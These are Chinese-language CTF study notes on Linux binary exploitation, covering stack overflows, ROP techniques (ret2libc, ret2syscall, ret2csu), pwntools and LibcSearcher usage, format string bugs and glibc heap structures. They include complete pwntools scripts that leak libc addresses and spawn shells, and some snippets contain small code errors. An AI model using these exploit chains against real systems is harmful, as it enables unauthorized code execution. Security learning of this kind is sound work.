本质
1.栈溢出的本质
栈溢出本质是通过覆写垃圾数据,从而覆盖到具有控制程序执行流程的位置(不一定是ret_address)，达到控制数据来实现我们的目的(不一定是控制eip)
2.ROP的本质
rop的本质有俩个，一是：通过函数的底层实现(系统调用，系统层面),来实现用户空间的某些函数达到我们的目的。也可以理解为绕过了用户层的限制直接调用系统层的函数实现调用函数(也可以是别的结构)。
二是：通过控制ebp,esp(也可以是别的内部结构)来标记栈(也可以是别的结构)的位置，从而利用栈(同上)的功能，实现我们想实现的功能。

动态链接
.dynamic节（section）
提供动态链接的相关信息
.address of dynamic（.got.plt）
.dynamic节的地址
link_map（.got.plt）
保存了进程载入动态链接的链表(一个程序有好几个动态库)
__dl_runtime_resolve(.got.plt)
被.plt所调用，用于解析第一次动态链接库中函数的真实地址,调用后向.got.plt中写入函数的真实地址
.got节（section）
全局偏移量表，保存了整个程序的虚拟内存中各个符号(变量)的偏移量
.got.plt（section）data
保存的是整个程序的虚拟内存中的各个函数(与.got节保存变量地址不同，保存的是函数地址)的地址

.plt节（section）code
.plt节(elf的code段)的代码用来执行解析libc共享库(code段函数)中的真实函数的地址，解析完成后会将函数的真实地址填写到.got.plt节(data段)中,第二次调用函数会从.got.plt节获取真实地址中直接跳转libc里去执行函数

第一次调用foo函数.plt表项中的内容
jmp *(foo@GOT)                      PLT0:
push index #foo的表项偏移           push *(GOT+4) #表示是去哪一个动态链接库
jmp PLT0                            jmp *(GOT+8)  #进入dl_runtime_resolve中，进行call _fix_up解析函数真实地址,并填入.got.plt

PLT0
   0x8048440:	push   DWORD PTR ds:0x804a004   #0x804a004地址中存放了一个库的地址
   0x8048446:	jmp    DWORD PTR ds:0x804a008   #0x804a008地址中存放了__dl_runtime_resovle函数的地址（libc中）
   0x804844c:	add    BYTE PTR [eax],al
   0x804844e:	add    BYTE PTR [eax],al
   0x8048450 <printf@plt>:	jmp    DWORD PTR ds:0x804a00c
   0x8048456 <printf@plt+6>:	push   0x0
   0x804845b <printf@plt+11>:	jmp    0x8048440


gcc
--staic 生成静态链接的c程序,没有加这个参数是动态链接的程序

ida
g 跳转到地址所在汇编代码

pwn
pwn主要研究的是虚拟内存的结构，revse研究的是ELF文件结构
1.ret2text
from pwn import *
io = process("./test")
io.recvline()
payload = b"A"*16+b"BBBB"+0x8048522
io.sendline(payload)
io.interactive()


ret2shellcode 
2.堆区利用ret2shellcode,需要先用mprotect赋予堆执行权限(不常见)
一般我们ret2shellcode都是写到.bss段,.bss段默认是可执行的
.bss段的随机化不被aslr影响，是被PIE保护影响
shellcraft.sh()                                 #要一个sh的shellcode,默认是32位shellcode
context.arch="amd64";shellcraft.amd64.sh()      #64位的shellcode
asm(shellcraft.sh())                            #已经是byte型的数据了

PIE保护
就是为了随机化ELF映像的地址，包括了.text,.data,.bss段的随机化

ASLR保护
/proc/sys/kernel/randomize_va_space=0;没有随机化
/proc/sys/kernel/randomize_va_space=1;部分随机化，共享库(lib库和堆)，栈，mmap()以及vDSO将被随机化
/proc/sys/kernel/randomize_va_space=2;完全随机化，在randomize_va_space=1的基础上，通过brk()分配的堆内存也被随机化

canary
stack中放入了stack guard


从上面的汇编代码可以看到0x80483e4是main函数的地址，追踪main函数的起始地址到start函数内部。在start函数(start函数call libc_start_main函数下一行是halt,即栈中ebp+4的值为0)内部将 main函数的地址压入栈中，立即调用__libc_start_main()函数.

ROP
ret2syscall
原理
mov eax,0xb
mov ebx,["/bin/sh"]
mov ecx,0
mov edx,0
int 0x80
execve("/bin/sh",null,null)
实现ROP
pop_eax_ret | 0xb | pop_ebx_ret | "/bin/sh"address | pop_ecx_ret | 0 | pop_edx_ret | 0 |int 0x80 address

ret2libc
system@plt addr | exit() address | "/bin/sh" address | 0
ret address(ebp)| exit address(ebp+4)|"/bin/sh"address(ebp+8) | 0  #可以看出我们已经破坏了栈的结构，原先retaddress变成了新栈针的ebp。即原先的栈由于新调用system@plt的原因，新压入了一个ebp,生成一个新的栈针从而使得栈往低地址多出一个4字节
ret2libc进阶
system@plt addr| pop_ret |“/bin/sh”| read@plt | exit | buf_addr|0   #即我们想在system和exit之间想添加一个read函数，就需要在system父栈针的ret_addr处添加一个pop_ret来弹出system的参数从而恢复栈继续控制程序执行流程(注意这里system的参数是一个，所以pop_ret，如果是多个，也要多几个pop)
若题目有system函数但没有/bin/sh，那我们应该怎么办呢
我们可以构造ROP链来调用写入的函数如gets(遇到换行符就结束接收),read(不管什么都接收，换行符也接收)等，一般我们写入的位置是.bss段
gets@plt | system@plt | buf2_addr | buf2_addr
ebp     | ebp +4    |  ebp +8   | ebp +c
        | ebp       | ebp +4    | ebp +8
思路:执行函数，在got表中会有libc函数的真实地址，泄漏libc地址，从而找到libc中system的地址
x64 ret2libc3
x64传参方式与x32不同
rdi,rsi,rdx,rcx,r8,r9,构造rop链时，先构造参数，参数都构造完毕后再传入函数的地址
先泄漏libc地址
pop_rdi_ret | pop_rsi_rdx_ret | 1 | write@got | 100 | write@plt | vulner_function  
计算system地址，再拿到shell
pop_rdi_ret | “/bin/sh”addr | system 

ret2csu
libc_csu_init,它只是一个劫持到libc_csu_init来布置环境
rbx,rbp,r12,r13,r14,r15都可以被我们控制,再跳转到开头，mov rdx,r13;mov rsi,r14;mov edi,r15d;call qword ptr[r12+rbx*8]




python
flat(list)      #将一个list列表中的每一个元素转换成字节型数据
flat([b'A'*112,pop_eax_ret,0xb,pop_edx_ecx_ebx_ret,0,0,0x804e522,int_80h])
payload = flat([b'A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
#flat模块能将pattern字符串和地址结合并且转为字节模式
elf.search(b"/bin/sh")
next(elf.search(b"/bin/sh"))

pwntools
基本使用
首先需要 from pwn import * 把 pwntools 导入进来，它同时会把一些系统库给导入进来
本地打的话 p=process('./filename')，远程的话 p=remote('192.168.1.103',10001)
p.close()  关闭
发送 payload
p.send(payload)   发送 payload
p.sendline(payload)   发送 payload，并进行换行（末尾\n）
p.sendafter(some_string, payload)   接收到 some_string 后, 发送你的 payload
p.sendlineafter(some_string, payload)   接收到 some_string 后, 发送你的 payload，加个换行
接收返回内容
p.recvn(N)   接受 N(数字) 字符
p.recvline()  接收一行输出
p.recvlines(N)   接收 N(数字) 行输出
p.recvuntil(some_string)   接收到 some_string 为止
p.interactive()    直接进行交互，相当于回到shell的模式，一般在取得shell之后使用
生成 shellcode
asm(shellcraft.sh())
ELF
首先需要 elf=ELF('./filename') 来产生一个对象
elf.symbols['buf2']  找到变量 buf2 或者其他函数的地址
elf.got['a_function']  找到 a_function的 got
elf.plt['a_function']  找到 a_function 的 plt
elf.next(e.search("some_characters"))  找到包含 some_characters 可以是字符串，汇编代码或者某个数值的地址
甚至可以修改一个ELF的代码
>>> e = ELF('/bin/cat')
>>> e.read(e.address+1, 3)
'ELF'
>>> e.asm(e.address, 'ret')
>>> e.save('/tmp/quiet-cat')
>>> disasm(file('/tmp/quiet-cat','rb').read(1))
'   0:   c3                      ret'
ELF模块在文档里好像还没有写的样子，不过可以从源码中看到一些可用的函数

    asm(address, assembly) : 在指定地址进行汇编
    bss(offset) : 返回bss段的位置，offset是偏移值
    checksec() : 对elf进行一些安全保护检查，例如NX, PIE等。
    disasm(address, n_bytes) : 在指定位置进行n_bytes个字节的反汇编
    offset_to_vaddr(offset) : 将文件中的偏移offset转换成虚拟地址VMA
    vaddr_to_offset(address) : 与上面的函数作用相反
    read(address, count) : 在address(VMA)位置读取count个字节
    write(address, data) : 在address(VMA)位置写入data
    section(name) : dump出指定section的数据


ROP
rop = ROP('./filename') 还是要先创建一个对象
rop.raw('a'*32)   在构造的 rop 链里面写 32 个 a
rop.call('read', (0, elf.bss(0x80)))  调用一个函数，可以简写成：rop.read(0, elf.bss(0x80))
rop.chain()   就是整个 rop 链，发送的 payload
rop.dump()  直观地展示当前的 rop 链
rop.migrate(base_stage)   将程序流程转移到 base_stage（地址）
rop.unresolve(value)  给出一个地址，反解析出符号
 rop.search(regs=['ecx','ebx'])   搜索对 eax 进行操作的 gadgets
rop.find_gadget(['pop eax','ret'])   搜索 pop eax ret 这样的 gadgets

DynELF
使用的话要先定义一个 leak 函数用来泄漏地址，然后就能找一个函数的地址了例如：
    def leak(address):
        ...
        return data
    d = DynELF(leak,'./file')
    sys_addr = d.lookup('system','libc')


该模块用于调用gdb调试
在python文件中直接设置断点，当运行到该位置之后就会断下
import pwnlib
from pwn import *
p = process('./c')
pwnlib.gdb.attach(p)

rop 模块
用于自动产生ROP链 还不支持X64?
elf = ELF('ropasaurusrex')
rop = ROP(elf)
rop.call('read', (0, elf.bss(0x80)))
rop.dump() ## 展示当前的ROP chain

### 搜索指定指令 rop.search(move=0, regs=None, order='size')
'''
move(int)，栈指针调整的字节数
regs(list)，搜索的寄存器list
order(str)，多个gadgets的排序方式，可选值=['size', 'regs']
'''
rop.r13_r14_r15_rbp == rop.search(regs=['r13','r14','r15','rbp'], order = 'regs')


rop.call, 两个参数，第一个是需要call的函数或者一个地址，第二个是函数参数，为list，只有一个参数需要在后面加上一个’,’使其变为list
也可以使用ROPgadget进行gadget搜索


LibcSearcher
实际上，在做题的时候没法查看 libc 的版本之类的，更没法拷贝到程序所在目录，连上服务器后就是程序运行起来的情况，那这时候就需要新的知识来解决了
LibcSearcher，可以通过它来找出偏移
我们先用 LibcSearcher 做一下之前开启 ALSR 保护的，然后再进行实战练习
可以看到 ASLR 是打开的
我们对比一下使用 LibcSearcher 和不使用的脚本的区别
可以看到主要区别就在这四行里面，下面讲解一下：
    libc=LibcSearcher('write',write_addr)
通过之前的 payload1 我们已经泄露出了 write 函数的地址了，我们直接使用 LibcSearcher('write',write_addr) 就可以找出 libc 的版本了
    libcbase=write_addr-libc.dump("write")
使用 libc.dump("write") 可以计算出 write 的偏移地址，再用 write_addr 减去偏移地址就得到了 libc 的基址
    system_addr=libcbase+libc.dump("system")
使用基址加上 system 的偏移，得到 system 的实际地址
    binsh_addr=libcbase+libc.dump("str_bin_sh")
使用基址加上 /bin/sh 字符串的偏移，得到 /bin/sh 的实际地址
使用 LibcSearcher 的脚本
    from pwn import *
    from LibcSearcher import *
    elf=ELF('level2')
    p=process('./level2')
    write_plt=elf.plt['write']
    write_got=elf.got['write']
    vulfun_addr = 0x08048404
    gdb.attach(p)
    payload1='A'*140+p32(write_plt)+p32(vulfun_addr)+p32(1)+p32(write_got)+p32(4)
    p.sendline(payload1)
    write_addr=u32(p.recv(4))
    libc=LibcSearcher('write',write_addr)
    libcbase=write_addr-libc.dump("write")
    #print(libcbase)
    system_addr=libcbase+libc.dump("system")
    binsh_addr=libcbase+libc.dump("str_bin_sh")
    payload2='A'*140+p32(system_addr)+p32(1234)+p32(binsh_addr)
    p.sendline(payload2)
    p.interactive()


x86 与 x64 的区别：
x86 都是保存在栈上面的， 而 x64 中的前六个参数依次保存在 RDI, RSI, RDX, RCX, R8 和 R9 中，如果还有更多的参数的话才会保存在栈上

小技巧
1,通过write的地址，找到对应的Libc，确定system和bin_sh的地址。
    write_addr = u64(p.recv(8))
    libc = LibcSearcher('write',write_addr)
    write_libc = libc.dump('write')
    system_libc = libc.dump('system')
    system_addr = write_addr - write_libc + system_libc
    binsh_addr = write_addr - write_libc + binsh_libc
首先通过溢出把一堆数据写在栈上，此时返回地址覆盖为 gadgets1，调用 gaegets1 的时候 rsp+8 通过 gadgets1 把栈上的数据写在寄存器里面，同时把 rsp 再加一下让程序返回到 gadgets2
gadgets2 会把之前寄存器上存的数据放在需要的寄存器上（参数存放顺序：RDI, RSI, RDX, RCX, R8 和 R9）
把 write 函数需要的参数部署好之后通过 call(r12+rbx*8) 之前把 rbx设置成了 0，当程序执行完 write 函数以后会自己回到这里（因为是 call，正常调用）所以不用管返回地址，继续执行，此时还会执行 gadgets1 上面那张图那样子，gadgets1 里面有一段 add rsp,38h 所以还要填充 38h 个字节把这一段填充掉，使得程序返回的时候是我们写在栈上的 main_addr
剩下的同理，只是 read 从标准输入流（0，即控制台）读取 0x100 放到 .bss 段里面
2.gdb中return可以直接返回main函数
3.c语言中所有函数传递字符串时其实都是传递的字符串指针
4.pwntools接收数据并转换为地址
    sh.recvuntil('[')
    buf_addr = sh.recvuntil(']', drop=True)
    buf_addr = int(buf_addr, 16)
5.eax 寄存器放系统调用号，查看 execve 的系统调用号：
    $cat /usr/include/asm/unistd_32.h | grep execve
6.ret2libc没有 system 也没有 /bin/sh，需要使用 libc 中的 system 和 /bin/sh，知道了libc中的一个函数的地址就可以确定该程序利用的 libc，从而知道其他函数的地址
获得 libc 的某个函数的地址通常采用的方法是：通过 got 表泄露，但是由于libc的延迟绑定，需要泄露的是已经执行过的函数的地址
总的来说：
1、通过第一次溢出，通过将 puts 的 PLT 地址放到返回处，泄漏出执行过的函数的 GOT 地址（实际上 puts 的就可以）
2、将 puts 的返回地址设置为 _start 函数（main () 函数是用户代码的入口，是对用户而言的；而_start () 函数是系统代码的入口，是程序真正的入口），方便再次用来执行 system('/bin/sh')
3、通过泄露的函数的 GOT 地址计算出 libc 中的 system 和 /bin/sh 的地址
4、再次通过溢出将返回地址覆盖成泄露出来的 system 的地址 getshell
    from pwn import *
    from LibcSearcher import *
    elf=ELF('ret2libc3')
    p=process('./ret2libc3')
    puts_plt=elf.plt['puts']
    puts_got=elf.got['puts']
    start_addr = elf.symbols['_start']
    #gdb.attach(p)
    payload1='A'*112+p32(puts_plt)+p32(start_addr)+p32(puts_got)
    p.sendlineafter("!?",payload1)
    puts_addr=u32(p.recv(4))
    libc=LibcSearcher('puts',puts_addr)
    libcbase=puts_addr-libc.dump("puts")
    system_addr=libcbase+libc.dump("system")
    binsh_addr=libcbase+libc.dump("str_bin_sh")
    payload2='A'*112+p32(system_addr)+p32(1234)+p32(binsh_addr)
    p.sendlineafter("!?",payload2)
    p.interactive()
5.ret2libc 这道题开启了 NX 保护，然而运行的时候会把 puts 的地址跟 /bin/sh 的地址告诉我们，使用 pwntools 可以把地址提取出来，再根据 libcsearcher 查出 system 的地址，这样就可以 getshell 了
    from pwn import *
    from LibcSearcher import LibcSearcher
    p=process('./pwn')
    p.recvuntil('is ')
    bin_addr = int(p.recvuntil('\n), 16)
    print hex(bin_addr)
    p.recvuntil('is ')
    puts_addr = int(p.recvuntil('\n'), 16)
    print hex(puts_addr)
    libc=LibcSearcher('puts',puts_addr)
    libc_base=puts_addr-libc.dump('puts')
    sys_addr=libc_base+libc.dump('system')
    payload2='a'*32+p32(sys_addr)+p32(1234)+p32(bin_addr)
    p.sendline(payload2)
    p.interactive()
这里脚本中p.recvuntil('is ') 代表的是 "is "之前的那一块，当下一个 recvuntil 的时候就会把这那块去掉了
把脚本里的第一个 p.recvuntil('is ') 替换成 
print p.recvuntil('of ')
print p.recvuntil('is ')
6.动态链接做一个小总结：
在想要调用的函数没有被调用过，想要调用他的时候，是按照这个过程来调用的
xxx@plt -> xxx@got -> xxx@plt -> 公共@plt -> _dl_runtime_resolve
到这里我们还需要知道
    1. _dl_runtime_resolve 是怎么知道要查找 printf 函数的
    2. _dl_runtime_resolve 找到 printf 函数地址之后，它怎么知道回填到哪个 GOT 表项
第一个问题，在 xxx@plt 中，我们在 jmp 之前 push 了一个参数，每个 xxx@plt 的 push 的操作数都不一样，那个参数就相当于函数的 id，告诉了 _dl_runtime_resolve 要去找哪一个函数的地址
在 elf 文件中 .rel.plt 保存了重定位表的信息，使用 readelf -r test 命令可以查看 test 可执行文件中的重定位信息
这里有些问题，对应着大佬博客说 plt 中 push 的操作数，就是对应函数在.rel.plt 段的偏移量，但是没对比出来
第二个问题，看 .rel.plt 的位置就对应着 xxx@plt 里 jmp 的地址
在 i386 架构下，除了每个函数占用一个 GOT 表项外，GOT 表项还保留了３个公共表项，也即 got 的前３项，分别保存：
    got [0]: 本 ELF 动态段 (.dynamic 段）的装载地址 
    got [1]：本 ELF 的 link_map 数据结构描述符地址 
    got [2]：_dl_runtime_resolve 函数的地址
动态链接器在加载完 ELF 之后，都会将这３地址写到 GOT 表的前３项
7.got EOF得到文件结束符
8.当一个漏洞的程序在构造rop时，无法继续执行，可以通过继续填写漏洞程序地址来第二次溢出控制我们想要的流程

花式栈溢出
smashes
canary崩溃时会打印出程序的环境变量,我们可以利用存放环境变量的地址出来达到泄漏一些东西
栈迁移
ebp和esp的重要程度不同，栈迁移的作用是用来控制esp的作用来达到控制栈针的作用
pop ebp;ret等
ret2csu
通过执行pop等操作来布置环境，最后通过mv来跳转到我们想去的地址

c语言函数
read(stdin/0,buf的地址，读入的长度)
strtol(buf的地址，buf中有字符串时将其存放的地址,几进制)    #把我们输入的数字要转换成字符串发送,(其实我们输入的数字12是12的ascii的值0x31320a)的值转换为整数的值
strcpy(目标地址(指针)，源地址(指针))    #将源地址指向中的字符串拷贝到目标地址中




格式化字符串漏洞
https://www.yuque.com/cyberangel/rg9gdm/rg6g4g
printf参数可控
x86下的格式化字符串
printf("%s,%s,%s")    #由于没有参数传入，所以会泄漏栈上的内容,也可以使服务崩溃
%x  4byte 以十六进制显示，不显示0x
%p  4byte 以指针的方式输出出来,他会加上0x，所以我们一般用%p打印栈上的内容
%d  4byte 以10进制整数方式显示，有符号
%u  4byte 以10进制整数方式显示，无符号
%s  4byte 以字符串方式显示,会把参数的地址解析，取出栈上的内容的地址中存放的字符串
%c  1byte 以字符的方式显示
长度
hh  1byte char
h   2byte short int
l   4byte long int 
ll  8byte longlong int
我们可以构造%n(随意)$p来泄漏栈上&%n$p参数上面第n个地址的内容
由于%n$p大多数情况下也保存在栈上(在&%n$p下面某个位置)，我们就可以写入任意地址addr%6$s，用%s泄漏任意地址addr里面保存的内容
例如print("0x400206%6$s"),假如0x400206中存放了flag，并且栈上&0x400206%6$s上面第6个参数正好存放了0x400206%6$s,就可以泄漏flag
一般漏洞流程 
strlen(str)
read(0,hello,11)    #只要我们能控制\x00截断符，我们就能控制

格式化字符串任意地址读写
%n  与%s类似，写入前方打印成功的个数,一次写入4个字节,0x00000001,如果0x400206%6$n是参数，那么会向400206内容中写入0x00000001
%hn  一下写入2个字节
%hhn 一下写入1个字节
%n(随意整数)$n 与上面%n$s功能类似，只是向栈中地址指针指向的内容中变成了写入打印成功字符的个数
%20c 一口气成功打印20个空字符
篡改任意地址的数据

x64下的格式化字符串
printf的第一个字符串参数在rdi,剩下的参数分别存放在rsi,rdx,rcx,r8,r9
小技巧：
1.不只是elf中存放在可以改的地方got
libc也存在可以修改函数，__malloc_hook __realloc_hook
如果elf的got表不允许修改的时候，可以改hook
elf中还有__IO_FILE可以修改
2.想要栈上有地址A指向got表，找到指向A的指针，就能修改A的指向。如果没有指向A的指针，找到一个二阶指针，就能更改一阶指针的指向，将其指向A
3.payload = %(D-16)c%(n)$x+%(C-D)c%(n+1)$x + %(B-C)c%(n+2)$x+ %(A-B)c%(n+3)$x 


堆溢出
https://www.cnblogs.com/unr4v31/p/14446412.html
什么是堆:根据用户的需求，动态分配内存的结构
堆管理器：是存在于动态链接库里面的一段代码,来管理堆区的内存
堆管理器相当于中介，在操作系统索取大量物理内存来零售分配给用户,并且管理用户释放的内存，归还给操作系统

各种堆管理器：
dlmalloc--general purpose allocator
ptmalloc--glibc
jemalloc--FreeBSD and firefox
tcmalloc--Google
libumem---solaris

堆管理器并不是由操作系统实现，而是由libc.so.6链接库实现(用户态的代码)。堆管理器封装了一些系统调用，为用户提供方便的动态内存接口的同时，力求高效地管理系统调用申请来的内存。
申请内存的系统调用：
__brk(sys_brk kernelcode):break单词的缩写，主线程使用brk系统调用可以将data段的结束地址扩展(扩展的内存其实属于堆)，
__mmap(sys_mmap_pgoff kernelcode):share libary其实真正的名叫mmap(memorymap)段，mmap申请内存是将物理内存(一大块内存)映射到虚拟内存中
主线程申请内存可以用brk(申请内存比较小)，如果申请内存过大会调用mmap，子线程只能用mmap申请内存

分页机制，我们堆虚拟内存的每一个4kb(一页)都是从物理内存映射过来的

堆管理器是怎么工作的：
arena:内存分配区,可以理解为堆内存管理器所持有的内存池,线程的堆内存分配区
操作系统------堆管理器-------用户
物理内存------arena----------可用内存
一个进程可以有多个arena，因为一个进程有多个线程
chunk:用户内存的基本单位，malloc申请的内存指针指向thunk,绝对不会小于8字节(x64是16字节),只能分配字长整数倍的chunk
bin:垃圾内存收集;管理arena中空闲thunk的结构，以数组的形式存在，数组元素为相对应大小的thunk链表头，存在与arena的malloc_state中
bin只是一个数组而已.freethunk有不同的大小，数组元素就是不同大小freethunk链表的指针
             bin   bin  bin  bin  bin  bin  bin     #一个bin就是一个链表
fastbins[7]=|0x20|0x30|0x40|0x50|0x60|0x70|0x80|

在第一次malloc之前，堆段是没有初始化的。调用malloc后，堆段已经初始化

malloc thunk
_____________
|prev   size|   #前一个freechunk的大小,如果上一个thunk是mallocthunk，那么前一个thunk可以用这一个mallocthunk的prevsize字节
|size |A|M|P|   #A表示是否是主线程，M代表是是否是mmap,P为1代表前一个chunk是mallocthunk,p为0则前面一个thunk是freethunk
|AAAAAAAAAAA|   #malloc分配内存指针指向的内容
|___________|
                #prevsize的复用。malloc(0x20) = malloc(0x28)-------->malloc(n8)=malloc(n0)


fastbin freethunk
_____________
|prev   size|   #
|size |A|M|P|   #P为0时，代表连续俩块都是freethunk，就会进行合并thunk   
|fd:forward |   #下一个thunk的指针(指向thunk头,并不是用户申请指针)
|AAAAAAAAAAA|   #malloc分配内存指针指向的内容,里面写入的数据并没有被清除
|___________|
                #放在fastbin中的freethunk，size的P位仍然会被标记在使用中(即P=1),fastbin(因为要快，所以不能做一些操作)中的thunk不会被合并

unsorted/small bin freethunk
_____________
|prev   size|   #
|size |A|M|P|   #   
|fd:forward |   #后一个thunk的指针
|bk:backward|   #前一个thunk的指针
|AAAAAAAAAAA|   #
|___________|


large bin freethunk
_____________
|prev   size|   #
|size |A|M|P|   #   
|fd:forward |   #后一个thunk的指针
|bk:backward|   #前一个thunk的指针
|fd_nextsize|   #
|bk_nextsize|   #
|AAAAAAAAAAA|   #
|___________|

物理链表：我们通过prevsize可以知道前一个thunk的地址，前一个thunk的prevsize知道前前个thunk的地址，这样所有thunk就连了起来
物理链表使用size连接起来的
逻辑链表：有fd和bk指针连接起来的链表
逻辑链表使用指针连接起来

fastbins是后进thunk先出,fastbins是单向链表,P位永远为1,下一个物理相邻thunk永远为占用。
unsortedbin元素数组只有一个(只有俩个地址，指向头thunk和末尾thunk)，unsortedbin中挂载的thunk大小是不固定的。并且是双向链表,双向链表的取用是队列的形式，先进先出.unsortedbin可以看作成其他bins的缓冲区
smallbins 就是unsortedbin重复(一个bin俩个地址)，元素数组与fastbin大小(大小都相同)分类相似
largebins 和smallbins不太相同，smallbins的每一项bin大小都相同，但是largebins中的每一个bin大小都不同(都是一个范围递增).

struct malloc_state{
    mfastbinptr fastbinsY[]
    mcthunkptr top;
    mcthunkptr last_remainder;
    mcthunkptr bins[1](unsortedbin)  bins[2]~[63](smallbins) bins[64]~bins[126](largebins)
    unsigned int binmap[BINMAPSIZE]
    struct malloc_state *next;
    struct malloc_state *next_free;
    INTERNAL_SIZE_T attached_threads;
    INTERNAL_SIZE_T system_mem; 
    INTERNAL_SIZE_T max_system_mem;
}
一个arena(结构,可以理解为一个struct包含了所有bins的结构)管理着四种bins的链表(bins的结构).



